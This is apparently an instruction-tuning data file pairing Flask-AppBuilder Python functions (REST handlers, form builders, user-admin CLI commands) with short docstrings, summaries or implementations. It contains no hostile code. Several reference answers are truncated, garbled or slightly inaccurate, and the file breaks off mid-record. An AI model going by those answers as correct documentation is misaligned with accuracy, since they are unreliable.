{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef operation_helper(\n        self, path=None, operations=None, methods=None, func=None, **kwargs\n    ):\n        \"\"\"May mutate operations.\n        :param str path: Path to the resource\n        :param dict operations: A `dict` mapping HTTP methods to operation object. See\n        :param list methods: A list of methods registered for this path\n        \"\"\"\n        for method in methods:\n            yaml_doc_string = yaml_utils.load_operations_from_docstring(func.__doc__)\n            yaml_doc_string = yaml.safe_load(\n                str(yaml_doc_string).replace(\n                    \"{{self.__class__.__name__}}\", self.__class__.__name__\n                )\n            )\n            if yaml_doc_string:\n                operations[method.lower()] = yaml_doc_string.get(method.lower(), {})\n            else:\n                operations[method.lower()] = {}", "response": "May mutate operations. See\n       "}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef response(code, **kwargs):\n        _ret_json = jsonify(kwargs)\n        resp = make_response(_ret_json, code)\n        resp.headers[\"Content-Type\"] = \"application/json; charset=utf-8\"\n        return resp", "response": "Generic HTTP JSON response method"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _gen_labels_columns(self, list_columns):\n        for col in list_columns:\n            if not self.label_columns.get(col):\n                self.label_columns[col] = self._prettify_column(col)", "response": "Auto generates pretty label_columns from list of columns"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _label_columns_json(self, cols=None):\n        ret = {}\n        cols = cols or []\n        d = {k: v for (k, v) in self.label_columns.items() if k in cols}\n        for key, value in d.items():\n            ret[key] = as_unicode(_(value).encode(\"UTF-8\"))\n        return ret", "response": "Returns a dict with labels to be JSON serializable"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ninitialize the list titles and other properties.", "response": "def _init_titles(self):\n        \"\"\"\n            Init Titles if not defined\n        \"\"\"\n        super(ModelRestApi, self)._init_titles()\n        class_name = self.datamodel.model_name\n        if not self.list_title:\n            self.list_title = \"List \" + self._prettify_name(class_name)\n        if not self.add_title:\n            self.add_title = \"Add \" + self._prettify_name(class_name)\n        if not self.edit_title:\n            self.edit_title = \"Edit \" + self._prettify_name(class_name)\n        if not self.show_title:\n            self.show_title = \"Show \" + self._prettify_name(class_name)\n        self.title = self.list_title"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ninitializing base properties of the base class.", "response": "def _init_properties(self):\n        \"\"\"\n            Init Properties\n        \"\"\"\n        super(ModelRestApi, self)._init_properties()\n        # Reset init props\n        self.description_columns = self.description_columns or {}\n        self.list_exclude_columns = self.list_exclude_columns or []\n        self.show_exclude_columns = self.show_exclude_columns or []\n        self.add_exclude_columns = self.add_exclude_columns or []\n        self.edit_exclude_columns = self.edit_exclude_columns or []\n        self.order_rel_fields = self.order_rel_fields or {}\n        # Generate base props\n        list_cols = self.datamodel.get_user_columns_list()\n        if not self.list_columns and self.list_model_schema:\n            list(self.list_model_schema._declared_fields.keys())\n        else:\n            self.list_columns = self.list_columns or [\n                x\n                for x in self.datamodel.get_user_columns_list()\n                if x not in self.list_exclude_columns\n            ]\n\n        self._gen_labels_columns(self.list_columns)\n        self.order_columns = (\n            self.order_columns or\n            self.datamodel.get_order_columns_list(list_columns=self.list_columns)\n        )\n        # Process excluded columns\n        if not self.show_columns:\n            self.show_columns = [\n                x for x in list_cols if x not in self.show_exclude_columns\n            ]\n        if not self.add_columns:\n            self.add_columns = [\n                x for x in list_cols if x not in self.add_exclude_columns\n            ]\n        if not self.edit_columns:\n            self.edit_columns = [\n                x for x in list_cols if x not in self.edit_exclude_columns\n            ]\n        self._filters = self.datamodel.get_filters(self.search_columns)\n        self.edit_query_rel_fields = self.edit_query_rel_fields or dict()\n        self.add_query_rel_fields = self.add_query_rel_fields or dict()"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ngets an item from Model", "response": "def get(self, pk, **kwargs):\n        \"\"\"Get item from Model\n        ---\n        get:\n          parameters:\n          - in: path\n            schema:\n              type: integer\n            name: pk\n          - $ref: '#/components/parameters/get_item_schema'\n          responses:\n            200:\n              description: Item from Model\n              content:\n                application/json:\n                  schema:\n                    type: object\n                    properties:\n                      label_columns:\n                        type: object\n                      show_columns:\n                        type: array\n                        items:\n                          type: string\n                      description_columns:\n                        type: object\n                      show_title:\n                        type: string\n                      id:\n                        type: string\n                      result:\n                        $ref: '#/components/schemas/{{self.__class__.__name__}}.get'\n            400:\n              $ref: '#/components/responses/400'\n            401:\n              $ref: '#/components/responses/401'\n            404:\n              $ref: '#/components/responses/404'\n            422:\n              $ref: '#/components/responses/422'\n            500:\n              $ref: '#/components/responses/500'\n        \"\"\"\n        item = self.datamodel.get(pk, self._base_filters)\n        if not item:\n            return self.response_404()\n\n        _response = dict()\n        _args = kwargs.get(\"rison\", {})\n        select_cols = _args.get(API_SELECT_COLUMNS_RIS_KEY, [])\n        _pruned_select_cols = [col for col in select_cols if col in self.show_columns]\n        self.set_response_key_mappings(\n            _response,\n            self.get,\n            _args,\n            **{API_SELECT_COLUMNS_RIS_KEY: _pruned_select_cols}\n        )\n        if _pruned_select_cols:\n            _show_model_schema = self.model2schemaconverter.convert(_pruned_select_cols)\n        else:\n            _show_model_schema = self.show_model_schema\n\n        _response[\"id\"] = pk\n        _response[API_RESULT_RES_KEY] = _show_model_schema.dump(item, many=False).data\n        self.pre_get(_response)\n        return self.response(200, **_response)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_list(self, **kwargs):\n        _response = dict()\n        _args = kwargs.get(\"rison\", {})\n        # handle select columns\n        select_cols = _args.get(API_SELECT_COLUMNS_RIS_KEY, [])\n        _pruned_select_cols = [col for col in select_cols if col in self.list_columns]\n        self.set_response_key_mappings(\n            _response,\n            self.get_list,\n            _args,\n            **{API_SELECT_COLUMNS_RIS_KEY: _pruned_select_cols}\n        )\n\n        if _pruned_select_cols:\n            _list_model_schema = self.model2schemaconverter.convert(_pruned_select_cols)\n        else:\n            _list_model_schema = self.list_model_schema\n        # handle filters\n        joined_filters = self._handle_filters_args(_args)\n        # handle base order\n        order_column, order_direction = self._handle_order_args(_args)\n        # handle pagination\n        page_index, page_size = self._handle_page_args(_args)\n        # Make the query\n        query_select_columns = _pruned_select_cols or self.list_columns\n        count, lst = self.datamodel.query(\n            joined_filters,\n            order_column,\n            order_direction,\n            page=page_index,\n            page_size=page_size,\n            select_columns=query_select_columns,\n        )\n        pks = self.datamodel.get_keys(lst)\n        _response[API_RESULT_RES_KEY] = _list_model_schema.dump(lst, many=True).data\n        _response[\"ids\"] = pks\n        _response[\"count\"] = count\n        self.pre_get_list(_response)\n        return self.response(200, **_response)", "response": "Get list of items from Model\nalternate"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef post(self):\n        if not request.is_json:\n            return self.response_400(message=\"Request is not JSON\")\n        try:\n            item = self.add_model_schema.load(request.json)\n        except ValidationError as err:\n            return self.response_422(message=err.messages)\n        # This validates custom Schema with custom validations\n        if isinstance(item.data, dict):\n            return self.response_422(message=item.errors)\n        self.pre_add(item.data)\n        try:\n            self.datamodel.add(item.data, raise_exception=True)\n            self.post_add(item.data)\n            return self.response(\n                201,\n                **{\n                    API_RESULT_RES_KEY: self.add_model_schema.dump(\n                        item.data, many=False\n                    ).data,\n                    \"id\": self.datamodel.get_pk_value(item.data),\n                }\n            )\n        except IntegrityError as e:\n            return self.response_422(message=str(e.orig))", "response": "POST method for adding new item to Model\n           "}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nposts item to Model", "response": "def put(self, pk):\n        \"\"\"POST item to Model\n        ---\n        put:\n          parameters:\n          - in: path\n            schema:\n              type: integer\n            name: pk\n          requestBody:\n            description: Model schema\n            required: true\n            content:\n              application/json:\n                schema:\n                  $ref: '#/components/schemas/{{self.__class__.__name__}}.put'\n          responses:\n            200:\n              description: Item changed\n              content:\n                application/json:\n                  schema:\n                    type: object\n                    properties:\n                      result:\n                        $ref: '#/components/schemas/{{self.__class__.__name__}}.put'\n            400:\n              $ref: '#/components/responses/400'\n            401:\n              $ref: '#/components/responses/401'\n            404:\n              $ref: '#/components/responses/404'\n            422:\n              $ref: '#/components/responses/422'\n            500:\n              $ref: '#/components/responses/500'\n        \"\"\"\n        item = self.datamodel.get(pk, self._base_filters)\n        if not request.is_json:\n            return self.response(400, **{\"message\": \"Request is not JSON\"})\n        if not item:\n            return self.response_404()\n        try:\n            data = self._merge_update_item(item, request.json)\n            item = self.edit_model_schema.load(data, instance=item)\n        except ValidationError as err:\n            return self.response_422(message=err.messages)\n        # This validates custom Schema with custom validations\n        if isinstance(item.data, dict):\n            return self.response_422(message=item.errors)\n        self.pre_update(item.data)\n        try:\n            self.datamodel.edit(item.data, raise_exception=True)\n            self.post_update(item)\n            return self.response(\n                200,\n                **{\n                    API_RESULT_RES_KEY: self.edit_model_schema.dump(\n                        item.data, many=False\n                    ).data\n                }\n            )\n        except IntegrityError as e:\n            return self.response_422(message=str(e.orig))"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef delete(self, pk):\n        item = self.datamodel.get(pk, self._base_filters)\n        if not item:\n            return self.response_404()\n        self.pre_delete(item)\n        try:\n            self.datamodel.delete(item, raise_exception=True)\n            self.post_delete(item)\n            return self.response(200, message=\"OK\")\n        except IntegrityError as e:\n            return self.response_422(message=str(e.orig))", "response": "Delete an item from Model\n           "}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _handle_page_args(self, rison_args):\n        page = rison_args.get(API_PAGE_INDEX_RIS_KEY, 0)\n        page_size = rison_args.get(API_PAGE_SIZE_RIS_KEY, self.page_size)\n        return self._sanitize_page_args(page, page_size)", "response": "Helper function to handle rison page\n            arguments sets defaults and impose\n           \n           "}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nhelp function to handle rison order arguments", "response": "def _handle_order_args(self, rison_args):\n        \"\"\"\n            Help function to handle rison order\n            arguments\n\n        :param rison_args:\n        :return:\n        \"\"\"\n        order_column = rison_args.get(API_ORDER_COLUMN_RIS_KEY, \"\")\n        order_direction = rison_args.get(API_ORDER_DIRECTION_RIS_KEY, \"\")\n        if not order_column and self.base_order:\n            order_column, order_direction = self.base_order\n        if order_column not in self.order_columns:\n            return \"\", \"\"\n        return order_column, order_direction"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns a dict with col descriptions to be JSON serializable", "response": "def _description_columns_json(self, cols=None):\n        \"\"\"\n            Prepares dict with col descriptions to be JSON serializable\n        \"\"\"\n        ret = {}\n        cols = cols or []\n        d = {k: v for (k, v) in self.description_columns.items() if k in cols}\n        for key, value in d.items():\n            ret[key] = as_unicode(_(value).encode(\"UTF-8\"))\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns a dict with field details as a response", "response": "def _get_field_info(self, field, filter_rel_field, page=None, page_size=None):\n        \"\"\"\n            Return a dict with field details\n            ready to serve as a response\n\n        :param field: marshmallow field\n        :return: dict with field details\n        \"\"\"\n        ret = dict()\n        ret[\"name\"] = field.name\n        ret[\"label\"] = self.label_columns.get(field.name, \"\")\n        ret[\"description\"] = self.description_columns.get(field.name, \"\")\n        # Handles related fields\n        if isinstance(field, Related) or isinstance(field, RelatedList):\n            ret[\"count\"], ret[\"values\"] = self._get_list_related_field(\n                field, filter_rel_field, page=page, page_size=page_size\n            )\n        if field.validate and isinstance(field.validate, list):\n            ret[\"validate\"] = [str(v) for v in field.validate]\n        elif field.validate:\n            ret[\"validate\"] = [str(field.validate)]\n        ret[\"type\"] = field.__class__.__name__\n        ret[\"required\"] = field.required\n        ret[\"unique\"] = field.unique\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _get_fields_info(self, cols, model_schema, filter_rel_fields, **kwargs):\n        ret = list()\n        for col in cols:\n            page = page_size = None\n            col_args = kwargs.get(col, {})\n            if col_args:\n                page = col_args.get(API_PAGE_INDEX_RIS_KEY, None)\n                page_size = col_args.get(API_PAGE_SIZE_RIS_KEY, None)\n            ret.append(\n                self._get_field_info(\n                    model_schema.fields[col],\n                    filter_rel_fields.get(col, []),\n                    page=page,\n                    page_size=page_size,\n                )\n            )\n        return ret", "response": "Returns a dict with fields detail\n            from a marshmallow model schema"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _get_list_related_field(\n        self, field, filter_rel_field, page=None, page_size=None\n    ):\n        \"\"\"\n            Return a list of values for a related field\n\n        :param field: Marshmallow field\n        :param filter_rel_field: Filters for the related field\n        :param page: The page index\n        :param page_size: The page size\n        :return: (int, list) total record count and list of dict with id and value\n        \"\"\"\n        ret = list()\n        if isinstance(field, Related) or isinstance(field, RelatedList):\n            datamodel = self.datamodel.get_related_interface(field.name)\n            filters = datamodel.get_filters(datamodel.get_search_columns_list())\n            page, page_size = self._sanitize_page_args(page, page_size)\n            order_field = self.order_rel_fields.get(field.name)\n            if order_field:\n                order_column, order_direction = order_field\n            else:\n                order_column, order_direction = \"\", \"\"\n            if filter_rel_field:\n                filters = filters.add_filter_list(filter_rel_field)\n            count, values = datamodel.query(\n                filters, order_column, order_direction, page=page, page_size=page_size\n            )\n            for value in values:\n                ret.append({\"id\": datamodel.get_pk_value(value), \"value\": str(value)})\n        return count, ret", "response": "Return a list of values for a related field"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _merge_update_item(self, model_item, data):\n        data_item = self.edit_model_schema.dump(model_item, many=False).data\n        for _col in self.edit_columns:\n            if _col not in data.keys():\n                data[_col] = data_item[_col]\n        return data", "response": "Merge a model item with a python data structure"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ncreate a WTForm field for many to one related fields.", "response": "def _convert_many_to_one(self, col_name, label, description,\n                             lst_validators, filter_rel_fields,\n                             form_props):\n        \"\"\"\n            Creates a WTForm field for many to one related fields,\n            will use a Select box based on a query. Will only\n            work with SQLAlchemy interface.\n        \"\"\"\n        query_func = self._get_related_query_func(col_name, filter_rel_fields)\n        get_pk_func = self._get_related_pk_func(col_name)\n        extra_classes = None\n        allow_blank = True\n        if not self.datamodel.is_nullable(col_name):\n            lst_validators.append(validators.DataRequired())\n            allow_blank = False\n        else:\n            lst_validators.append(validators.Optional())\n        form_props[col_name] = \\\n            QuerySelectField(label,\n                             description=description,\n                             query_func=query_func,\n                             get_pk_func=get_pk_func,\n                             allow_blank=allow_blank,\n                             validators=lst_validators,\n                             widget=Select2Widget(extra_classes=extra_classes))\n        return form_props"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ncreate a form given a list of columns.", "response": "def create_form(self, label_columns=None, inc_columns=None,\n                    description_columns=None, validators_columns=None,\n                    extra_fields=None, filter_rel_fields=None):\n        \"\"\"\n            Converts a model to a form given\n\n            :param label_columns:\n                A dictionary with the column's labels.\n            :param inc_columns:\n                A list with the columns to include\n            :param description_columns:\n                A dictionary with a description for cols.\n            :param validators_columns:\n                A dictionary with WTForms validators ex::\n\n                    validators={'personal_email':EmailValidator}\n\n            :param extra_fields:\n                A dictionary containing column names and a WTForm\n                Form fields to be added to the form, these fields do not\n                 exist on the model itself ex::\n\n                    extra_fields={'some_col':BooleanField('Some Col', default=False)}\n\n            :param filter_rel_fields:\n                A filter to be applied on relationships\n        \"\"\"\n        label_columns = label_columns or {}\n        inc_columns = inc_columns or []\n        description_columns = description_columns or {}\n        validators_columns = validators_columns or {}\n        extra_fields = extra_fields or {}\n        form_props = {}\n        for col_name in inc_columns:\n            if col_name in extra_fields:\n                form_props[col_name] = extra_fields.get(col_name)\n            else:\n                self._convert_col(col_name, self._get_label(col_name, label_columns),\n                                  self._get_description(col_name, description_columns),\n                                  self._get_validators(col_name, validators_columns),\n                                  filter_rel_fields, form_props)\n        return type('DynamicForm', (DynamicForm,), form_props)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get(self, pk):\n        for item in self.store.get(self.query_class):\n            # coverts pk value to correct type\n            pk = item.properties[item.pk].col_type(pk)\n            if getattr(item, item.pk) == pk:\n                return item", "response": "Returns the object for the keypk"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nqueries the database for the specified model class.", "response": "def query(self, model_cls):\n        \"\"\"\n            SQLAlchemy query like method\n        \"\"\"\n        self._filters_cmd = list()\n        self.query_filters = list()\n        self._order_by_cmd = None\n        self._offset = 0\n        self._limit = 0\n        self.query_class = model_cls._name\n        return self"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef all(self):\n        items = list()\n        if not self._filters_cmd:\n            items = self.store.get(self.query_class)\n        else:\n            for item in self.store.get(self.query_class):\n                tmp_flag = True\n                for filter_cmd in self._filters_cmd:\n                    if not filter_cmd[0](item, filter_cmd[1], filter_cmd[2]):\n                        tmp_flag = False\n                        break\n                if tmp_flag:\n                    items.append(item)\n        if self._order_by_cmd:\n            items = self._order_by(items, self._order_by_cmd)\n        total_length = len(items)\n        if self._limit != 0:\n            items = items[self._offset: self._offset + self._limit]\n        return total_length, items", "response": "SQLA like all method will populate all rows and apply all filters and orders to it."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef link_order_filter(self, column, modelview_name):\n        new_args = request.view_args.copy()\n        args = request.args.copy()\n        if (\"_oc_\" + modelview_name) in args:\n            args[\"_oc_\" + modelview_name] = column\n            if args.get(\"_od_\" + modelview_name) == \"asc\":\n                args[\"_od_\" + modelview_name] = \"desc\"\n            else:\n                args[\"_od_\" + modelview_name] = \"asc\"\n        else:\n            args[\"_oc_\" + modelview_name] = column\n            args[\"_od_\" + modelview_name] = \"asc\"\n        return url_for(\n            request.endpoint,\n            **dict(list(new_args.items()) + list(args.to_dict().items()))\n        )", "response": "Link to the order of the items in the current page."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef link_page_filter(self, page, modelview_name):\n        new_args = request.view_args.copy()\n        args = request.args.copy()\n        args[\"page_\" + modelview_name] = page\n        return url_for(\n            request.endpoint,\n            **dict(list(new_args.items()) + list(args.to_dict().items()))\n        )", "response": "Link the current page to the current modelview."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef link_page_size_filter(self, page_size, modelview_name):\n        new_args = request.view_args.copy()\n        args = request.args.copy()\n        args[\"psize_\" + modelview_name] = page_size\n        return url_for(\n            request.endpoint,\n            **dict(list(new_args.items()) + list(args.to_dict().items()))\n        )", "response": "Link to the resource with the specified page size."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef reset_password(app, appbuilder, username, password):\n    _appbuilder = import_application(app, appbuilder)\n    user = _appbuilder.sm.find_user(username=username)\n    if not user:\n        click.echo(\"User {0} not found.\".format(username))\n    else:\n        _appbuilder.sm.reset_password(user.id, password)\n        click.echo(click.style(\"User {0} reseted.\".format(username), fg=\"green\"))", "response": "Reset a user s password"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ncreating an admin user", "response": "def create_admin(app, appbuilder, username, firstname, lastname, email, password):\n    \"\"\"\n        Creates an admin user\n    \"\"\"\n    auth_type = {\n        c.AUTH_DB: \"Database Authentications\",\n        c.AUTH_OID: \"OpenID Authentication\",\n        c.AUTH_LDAP: \"LDAP Authentication\",\n        c.AUTH_REMOTE_USER: \"WebServer REMOTE_USER Authentication\",\n        c.AUTH_OAUTH: \"OAuth Authentication\",\n    }\n    _appbuilder = import_application(app, appbuilder)\n    click.echo(\n        click.style(\n            \"Recognized {0}.\".format(\n                auth_type.get(_appbuilder.sm.auth_type, \"No Auth method\")\n            ),\n            fg=\"green\",\n        )\n    )\n    role_admin = _appbuilder.sm.find_role(_appbuilder.sm.auth_role_admin)\n    user = _appbuilder.sm.add_user(\n        username, firstname, lastname, email, role_admin, password\n    )\n    if user:\n        click.echo(click.style(\"Admin User {0} created.\".format(username), fg=\"green\"))\n    else:\n        click.echo(click.style(\"No user created an error occured\", fg=\"red\"))"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ncreates a user in the naclient", "response": "def create_user(app, appbuilder, role, username, firstname, lastname, email, password):\n    \"\"\"\n        Create a user\n    \"\"\"\n    _appbuilder = import_application(app, appbuilder)\n    role_object = _appbuilder.sm.find_role(role)\n    user = _appbuilder.sm.add_user(\n        username, firstname, lastname, email, role_object, password\n    )\n    if user:\n        click.echo(click.style(\"User {0} created.\".format(username), fg=\"green\"))\n    else:\n        click.echo(click.style(\"Error! No user created\", fg=\"red\"))"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nrun Flask dev web server.", "response": "def run(app, appbuilder, host, port, debug):\n    \"\"\"\n        Runs Flask dev web server.\n    \"\"\"\n    _appbuilder = import_application(app, appbuilder)\n    _appbuilder.get_app.run(host=host, port=port, debug=debug)"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ncreates all your database objects.", "response": "def create_db(app, appbuilder):\n    \"\"\"\n        Create all your database objects (SQLAlchemy specific).\n    \"\"\"\n    from flask_appbuilder.models.sqla import Base\n\n    _appbuilder = import_application(app, appbuilder)\n    engine = _appbuilder.get_session.get_bind(mapper=None, clause=None)\n    Base.metadata.create_all(engine)\n    click.echo(click.style(\"DB objects created\", fg=\"green\"))"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef version(app, appbuilder):\n    _appbuilder = import_application(app, appbuilder)\n    click.echo(\n        click.style(\n            \"F.A.B Version: {0}.\".format(_appbuilder.version), bg=\"blue\", fg=\"white\"\n        )\n    )", "response": "Show version of the application."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef security_cleanup(app, appbuilder):\n    _appbuilder = import_application(app, appbuilder)\n    _appbuilder.security_cleanup()\n    click.echo(click.style(\"Finished security cleanup\", fg=\"green\"))", "response": "Cleanup unused permissions from views and roles."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nlisting all registered views", "response": "def list_views(app, appbuilder):\n    \"\"\"\n        List all registered views\n    \"\"\"\n    _appbuilder = import_application(app, appbuilder)\n    echo_header(\"List of registered views\")\n    for view in _appbuilder.baseviews:\n        click.echo(\n            \"View:{0} | Route:{1} | Perms:{2}\".format(\n                view.__class__.__name__, view.route_base, view.base_permissions\n            )\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef list_users(app, appbuilder):\n    _appbuilder = import_application(app, appbuilder)\n    echo_header(\"List of users\")\n    for user in _appbuilder.sm.get_all_users():\n        click.echo(\n            \"username:{0} | email:{1} | role:{2}\".format(\n                user.username, user.email, user.roles\n            )\n        )", "response": "List all users on the database"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ncollects static files from flask - appbuilder static folder to your projects static folder", "response": "def collect_static(static_folder):\n    \"\"\"\n        Copies flask-appbuilder static files to your projects static folder\n    \"\"\"\n    appbuilder_static_path = os.path.join(\n        os.path.dirname(os.path.abspath(__file__)), \"static/appbuilder\"\n    )\n    app_static_path = os.path.join(os.getcwd(), static_folder)\n    if not os.path.isdir(app_static_path):\n        click.echo(\n            click.style(\n                \"Static folder does not exist creating: %s\" % app_static_path,\n                fg=\"green\",\n            )\n        )\n        os.makedirs(app_static_path)\n    try:\n        shutil.copytree(\n            appbuilder_static_path, os.path.join(app_static_path, \"appbuilder\")\n        )\n    except Exception:\n        click.echo(\n            click.style(\n                \"Appbuilder static folder already exists on your project\", fg=\"red\"\n            )\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nfunctions to use on Group by Charts. accepts a list and returns the average of the list s items", "response": "def aggregate_avg(items, col):\n    \"\"\"\n        Function to use on Group by Charts.\n        accepts a list and returns the average of the list's items\n    \"\"\"\n    try:\n        return aggregate_sum(items, col) / aggregate_count(items, col)\n    except Exception:\n        log.warning(c.LOGMSG_WAR_DBI_AVG_ZERODIV)\n        return 0.0"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef to_json(self, data, labels=None):\n        labels = labels or dict()\n        json_data = dict()\n        json_data[\"cols\"] = []\n        # Create Structure to identify the grouped columns\n        for group_col in self.group_bys_cols:\n            label = \"\" or as_unicode(labels[group_col])\n            json_data[\"cols\"].append(\n                {\"id\": group_col, \"label\": label, \"type\": \"string\"}\n            )\n        # Create Structure to identify the Aggregated columns\n        for aggr_col in self.aggr_by_cols:\n            if isinstance(aggr_col, tuple):\n                label_key = aggr_col[0].__name__ + aggr_col[1]\n                aggr_col = aggr_col[1]\n            else:\n                label_key = aggr_col\n            label = \"\" or as_unicode(labels[label_key])\n            json_data[\"cols\"].append({\"id\": aggr_col, \"label\": label, \"type\": \"number\"})\n        # Create Structure with the data\n        json_data[\"rows\"] = []\n        for item in data:\n            row = {\"c\": []}\n            if not isinstance(item[0], tuple):\n                row[\"c\"].append({\"v\": \"{0}\".format(item[0])})\n            else:\n                for group_col_data in item[0]:\n                    row[\"c\"].append({\"v\": \"{0}\".format(group_col_data)})\n            for col_data in item[1:]:\n                if isinstance(col_data, datetime.date):\n                    row[\"c\"].append({\"v\": \"{0}\".format(col_data)})\n                else:\n                    row[\"c\"].append({\"v\": col_data})\n            json_data[\"rows\"].append(row)\n        return json_data", "response": "Returns a dict with Google JSON structure for charts\n           "}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef create_blueprint(self, appbuilder, endpoint=None, static_folder=None):\n        # Store appbuilder instance\n        self.appbuilder = appbuilder\n\n        # If endpoint name is not provided, get it from the class name\n        self.endpoint = endpoint or self.__class__.__name__\n\n        if self.route_base is None:\n            self.route_base = \"/\" + self.__class__.__name__.lower()\n\n        self.static_folder = static_folder\n        if not static_folder:\n            # Create blueprint and register rules\n            self.blueprint = Blueprint(\n                self.endpoint,\n                __name__,\n                url_prefix=self.route_base,\n                template_folder=self.template_folder,\n            )\n        else:\n            self.blueprint = Blueprint(\n                self.endpoint,\n                __name__,\n                url_prefix=self.route_base,\n                template_folder=self.template_folder,\n                static_folder=static_folder,\n            )\n        self._register_urls()\n        return self.blueprint", "response": "Create Flask blueprint. You will generally not use it."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef render_template(self, template, **kwargs):\n        kwargs[\"base_template\"] = self.appbuilder.base_template\n        kwargs[\"appbuilder\"] = self.appbuilder\n        return render_template(\n            template, **dict(list(kwargs.items()) + list(self.extra_args.items()))\n        )", "response": "Render the template with the extra_args as keyword arguments"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef update_redirect(self):\n        page_history = Stack(session.get(\"page_history\", []))\n        page_history.push(request.url)\n        session[\"page_history\"] = page_history.to_json()", "response": "Update the back history navigation."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn the previous url.", "response": "def get_redirect(self):\n        \"\"\"\n            Returns the previous url.\n        \"\"\"\n        index_url = self.appbuilder.get_url_for_index\n        page_history = Stack(session.get(\"page_history\", []))\n\n        if page_history.pop() is None:\n            return index_url\n        session[\"page_history\"] = page_history.to_json()\n        url = page_history.pop() or index_url\n        return url"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns a dict with labels to be JSON serializable", "response": "def _label_columns_json(self):\n        \"\"\"\n            Prepares dict with labels to be JSON serializable\n        \"\"\"\n        ret = {}\n        for key, value in list(self.label_columns.items()):\n            ret[key] = as_unicode(value.encode(\"UTF-8\"))\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _init_forms(self):\n        super(BaseCRUDView, self)._init_forms()\n        conv = GeneralModelConverter(self.datamodel)\n        if not self.add_form:\n            self.add_form = conv.create_form(\n                self.label_columns,\n                self.add_columns,\n                self.description_columns,\n                self.validators_columns,\n                self.add_form_extra_fields,\n                self.add_form_query_rel_fields,\n            )\n        if not self.edit_form:\n            self.edit_form = conv.create_form(\n                self.label_columns,\n                self.edit_columns,\n                self.description_columns,\n                self.validators_columns,\n                self.edit_form_extra_fields,\n                self.edit_form_query_rel_fields,\n            )", "response": "Initializes the add and edit forms for Add and Edit."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _init_properties(self):\n        super(BaseCRUDView, self)._init_properties()\n        # Reset init props\n        self.related_views = self.related_views or []\n        self._related_views = self._related_views or []\n        self.description_columns = self.description_columns or {}\n        self.validators_columns = self.validators_columns or {}\n        self.formatters_columns = self.formatters_columns or {}\n        self.add_form_extra_fields = self.add_form_extra_fields or {}\n        self.edit_form_extra_fields = self.edit_form_extra_fields or {}\n        self.show_exclude_columns = self.show_exclude_columns or []\n        self.add_exclude_columns = self.add_exclude_columns or []\n        self.edit_exclude_columns = self.edit_exclude_columns or []\n        # Generate base props\n        list_cols = self.datamodel.get_user_columns_list()\n        self.list_columns = self.list_columns or [list_cols[0]]\n        self._gen_labels_columns(self.list_columns)\n        self.order_columns = (\n            self.order_columns or\n            self.datamodel.get_order_columns_list(list_columns=self.list_columns)\n        )\n        if self.show_fieldsets:\n            self.show_columns = []\n            for fieldset_item in self.show_fieldsets:\n                self.show_columns = self.show_columns + list(\n                    fieldset_item[1].get(\"fields\")\n                )\n        else:\n            if not self.show_columns:\n                self.show_columns = [\n                    x for x in list_cols if x not in self.show_exclude_columns\n                ]\n        if self.add_fieldsets:\n            self.add_columns = []\n            for fieldset_item in 